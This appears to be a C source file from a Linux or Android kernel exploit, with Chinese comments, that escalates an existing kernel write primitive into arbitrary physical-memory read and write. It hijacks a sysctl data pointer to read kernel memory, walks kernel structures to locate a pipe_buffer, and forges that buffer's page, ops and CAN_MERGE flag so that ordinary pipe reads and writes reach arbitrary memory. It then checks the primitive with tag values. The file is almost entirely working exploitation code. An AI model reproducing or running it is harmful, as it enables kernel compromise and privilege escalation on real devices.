#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

#define PHYS_READ_TAG  "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED    0x306365737562656eULL
#define PHYS64_NEXT    0x316365737562656eULL

/* ---------------------------------------------------------------- */
/* 全局状态                                                          */
/* ---------------------------------------------------------------- */

static int pipe_fds[2];
static int pipe_pair_ready;

/* sysctl 原语的 fd 句柄，找到 pipe_buffer 后置 -1 释放 */
static int sysctl_fd = -1;
/* fds_addr 只作为一次性缓存使用，找到 pipe_buffer 后不再需要 */
static uint64_t fds_addr = 0;

static uintptr_t pipebuf_addr;
static uintptr_t pipebuf_page_base;

static char physrw_readback[64];
static char physrw_after_write[64];
static int physrw_read_ok;
static int physrw_write_ok;
static uint64_t physrw_read64_before;
static uint64_t physrw_read64_after;
static uint64_t physrw_write64_value;
static int physrw_read64_ok;
static int physrw_write64_ok;

/* ---------------------------------------------------------------- */
/* sysctl 内核读原语（显式传 kfd，不再依赖全局 rw_ashmem_fd）          */
/* ---------------------------------------------------------------- */

int sysctl_fill(int kfd, uintptr_t addr, int long_num) {
    if (kfd < 0) return -1;
    unsigned char buf[sizeof(addr) + sizeof(long_num)];
    put64(buf, 0, addr);
    put32(buf, sizeof(addr), long_num * sizeof(long));
    return KWRITE(kfd,text_addr(SYSCTL_DATA_ADDR),buf) ? 0 : -1;
}

uint64_t sysctl_read(int kfd, uintptr_t addr) {
    if (addr && sysctl_fill(kfd, addr, 1)) return 0;
    if (sysctl_fd < 0) {
        sysctl_fd = open(SYSCTL_PATH, O_RDONLY | O_CLOEXEC);
        if (sysctl_fd < 0) {
            perror("open sysctl");
            return 0;
        }
    }
    char buf[256];
    ssize_t n;
    errno = 0;
    do {
        n = pread(sysctl_fd, buf, sizeof(buf) - 1, 0); /* 每次从 0 读最新值 */
    } while (n < 0 && errno == EINTR);

    if (n <= 0) return 0;
    buf[n] = '\0';

    errno = 0;
    char *end;
    uint64_t v = strtoul(buf, &end, 10);
    if (end == buf) return 0;
    if (errno != 0) {
        perror("sysctl strtoul");
        return 0;
    }
    return v;
}

/* 找到后立刻关闭 sysctl 原语 */
void sysctl_destroy(int kfd) {
    sysctl_fill(kfd,text_addr(SYSCTL_ORIGIN_DATA),SYSCTL_ORIGIN_LENGTH);
    if (sysctl_fd >= 0) {
        close(sysctl_fd);
        sysctl_fd = -1;
    }
}

/* 用 kfd 做 sysctl 遍历；用 target_fd 在 fds 中定位 file */
static uint64_t find_pipe(int kfd, int target_fd) {
    if (!fds_addr) {
        uint64_t mm = kernelsnitch(MM_STRUCT_SZ, MM_ORDER);
        pr_info("mm %"PRIx64"\n",mm);
        if (!is_direct_ptr(mm)) return 0;
/*        long buf[MM_STRUCT_SZ/sizeof(long)];
        int i;
        for(i=0;i<MM_STRUCT_SZ/sizeof(long);i++){
            buf[i]=sysctl_read(kfd,mm+sizeof(long)*i);
        };
        hexdump(buf,sizeof(buf));*/
        uint64_t cur = sysctl_read(kfd, mm + MM_OWNER_OFF);
        pr_info("cur %"PRIx64"\n",cur);
        if (!is_kernel_ptr(cur)) return 0;

        uint64_t files = sysctl_read(kfd, cur + TSK_FILES_OFF);
        pr_info("files %"PRIx64"\n",files);
        if (!is_kernel_ptr(files)) return 0;
        uint64_t fdt = sysctl_read(kfd, files + FILES_FDT_OFF);
        pr_info("fdt %"PRIx64"\n",fdt);
        if (!is_kernel_ptr(fdt)) return 0;
        fds_addr = sysctl_read(kfd, fdt + FDT_FD_OFF);
        pr_info("fds %"PRIx64"\n",fds_addr);
        if(!is_kernel_ptr(fds_addr)){
            fds_addr = 0;
            return 0;
        };
    }
    uint64_t file = sysctl_read(kfd, fds_addr + target_fd * sizeof(uint64_t));
    pr_info("file %"PRIx64"\n",file);
    if (!is_kernel_ptr(file)) return 0;
    uint64_t pipe_info = sysctl_read(kfd, file + FILE_PRIV_OFF);
    pr_info("private data/pipe info %"PRIx64"\n",pipe_info);
    if (!is_kernel_ptr(pipe_info)) return 0;
    uint64_t bufs = kernel_read64(kfd, pipe_info + PIPE_BUFS_OFF);
    return bufs;
}

/* ---------------------------------------------------------------- */
/* 单对管道管理                                                      */
/* ---------------------------------------------------------------- */

static void resize_pipe_slots(int pipefd[2], size_t slots) {
    SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

static int setup_pipe_pair(void) {
    if (pipe_pair_ready) return 1;
    SYSCHK(pipe(pipe_fds));
    resize_pipe_slots(pipe_fds, PIPE_BUFFER_SLOTS);

    /* 写 1 字节让 bufs[0] 成为活跃条目（head=1, tail=0）。
       之后每次伪造 bufs[0] 后 read/write 都命中同一条目。 */
    char byte = 'A';
    SYSCHK(write(pipe_fds[1], &byte, 1));
    pipe_pair_ready = 1;
    return 1;
}

void reset_pipe_attempt(void) {
    if (pipe_pair_ready) {
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        pipe_pair_ready = 0;
    }
    fds_addr = 0;
    pipebuf_addr = 0;
    pipebuf_page_base = 0;
    memset(physrw_readback, 0, sizeof(physrw_readback));
    memset(physrw_after_write, 0, sizeof(physrw_after_write));
    physrw_read_ok = 0;
    physrw_write_ok = 0;
    physrw_read64_ok = 0;
    physrw_write64_ok = 0;
}

/* ---------------------------------------------------------------- */
/* 地址换算                                                          */
/* ---------------------------------------------------------------- */

static uintptr_t direct_to_page(uintptr_t addr) {
    uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
    return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

static uintptr_t page_to_direct(uintptr_t page) {
    uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
    return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

static uintptr_t pipe_buf_ops_addr(void) {
    return text_addr(ANON_PIPE_BUF_OPS);
}

/* ---------------------------------------------------------------- */
/* 伪造 pipe_buffer 做物理读写                                       */
/* ---------------------------------------------------------------- */

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
    struct pipe_buffer saved;
    if(!KREAD(fd,buf_addr,saved))return 0;
    struct pipe_buffer pb = saved;
    pb.page = direct_to_page(direct_addr);
    pb.offset = direct_addr & (PAGE_SIZE - 1);
    pb.len = len + 1;   /* 让 read 一次取完 len 字节后 tail 不推进 */
    pb.ops = pipe_buf_ops_addr();
    pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
    pb.private = 0;

    if(!KWRITE(fd,buf_addr,pb))return 0;

    ssize_t got = read(pipefd[0], out, len);
    int ok = got == (ssize_t)len;
    kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
    return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
    struct pipe_buffer saved;

    if(!KREAD(fd,buf_addr,saved))return 0;

    struct pipe_buffer pb = saved;
    pb.page = direct_to_page(direct_addr);
    pb.offset = direct_addr & (PAGE_SIZE - 1);
    pb.len = 0;         /* 触发 pipe_write 的 CAN_MERGE 合并分支 */
    pb.ops = pipe_buf_ops_addr();
    pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
    pb.private = 0;

    if(!KWRITE(fd,buf_addr,pb))return 0;

    ssize_t wrote = write(pipefd[1], data, len);
    int ok = wrote == (ssize_t)len;
    kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
    return ok;
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
    if (pipebuf_addr == 0) return 0;
    if (!is_direct_ptr(direct_addr) ||
        (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
        return 0;
    }
    return pipe_phys_read(fd, pipe_fds, pipebuf_addr, direct_addr, out, len);
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
    if (pipebuf_addr == 0) return 0;
    if (!is_direct_ptr(direct_addr) ||
        (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
        return 0;
    }
    return pipe_phys_write(fd, pipe_fds, pipebuf_addr, direct_addr, data, len);
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
    uint64_t value = 0;
    pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
    return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
    uint32_t value = 0;
    pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
    return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
    return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

/* ---------------------------------------------------------------- */
/* 安装基于 pipe 的 physrw                                           */
/* ---------------------------------------------------------------- */
int install_pipe_physrw(int fd) {
    if (!setup_pipe_pair()) return 0;

    uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
    if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
        return 0;
    }

    /* 用 sysctl 走 task_struct -> files -> fdt -> file -> pipe_inode_info -> bufs */
    uint64_t bufs = find_pipe(fd, pipe_fds[0]);
    if (!is_kernel_ptr(bufs)) {
        pr_info("phys step find_pipe failed pipe_buf=%"PRIx64"\n",bufs);
        return 0;
    }
    pipebuf_addr = (uintptr_t)bufs;
    pipebuf_page_base = pipebuf_addr & ~(PAGE_SIZE - 1);
    pr_info("phys step pipebuf=%016zx\n", pipebuf_addr);
    fds_addr = 0;

    char seed[] = PHYS_READ_TAG;
    if(!KWRITE(fd,proof_addr,seed))return 0;

    memset(physrw_readback, 0, sizeof(physrw_readback));
    physrw_read_ok =
        pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
    pr_info("phys step probed read done ok=%d\n", physrw_read_ok);

    char overwrite[] = PHYS_WRITE_TAG;
    physrw_write_ok =
        pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
    pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
    kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));

    uintptr_t proof64_addr = proof_addr + 0x100;
    uint64_t seed64 = PHYS64_SEED;
    uint64_t next64 = PHYS64_NEXT;
    kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
    physrw_read64_before = pipe_read64(fd, proof64_addr);
    physrw_read64_ok = physrw_read64_before == seed64;
    pr_info("phys step read64 done ok=%d value=%016zx\n",
            physrw_read64_ok, physrw_read64_before);
    physrw_write64_value = next64;
    physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
    kernel_read_data(
        fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
    physrw_write64_ok =
        physrw_write64_ok && physrw_read64_after == physrw_write64_value;

    return physrw_read_ok &&
           memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
           physrw_write_ok &&
           memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
           physrw_read64_ok && physrw_write64_ok;
}
